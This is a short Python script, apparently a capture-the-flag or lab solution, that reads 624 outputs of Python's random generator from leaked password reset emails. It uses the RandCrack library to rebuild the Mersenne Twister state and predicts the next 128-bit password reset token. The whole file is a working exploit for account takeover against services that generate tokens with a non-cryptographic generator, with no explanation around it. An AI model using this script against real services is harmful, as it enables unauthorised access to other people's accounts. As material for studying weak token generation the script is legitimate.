from randcrack import RandCrack


data = []
for i in range(624 // 4):
    with open(f"emails/email{i}.txt", "r") as f:
        data.append(f.readlines()[2])

print(data[0])
data = [x.strip().split()[-1] for x in data]


print(data[0])

values = []

for x in data:
    tmp = []
    for i in range(4):
        tmp.append(int(x[i*8:(i+1)*8],16))
    temp = tmp[::-1]
    values += temp
# print(len(data))

print(values[0])
print(values[1])
print(len(values))

rc = RandCrack()
for i in range(624):
	rc.submit(values[i])
	# Could be filled with random.randint(0,4294967294) or random.randrange(0,4294967294)

print("passwor dreset token is:")
print( hex(rc.predict_getrandbits(128))[2:].zfill(32))
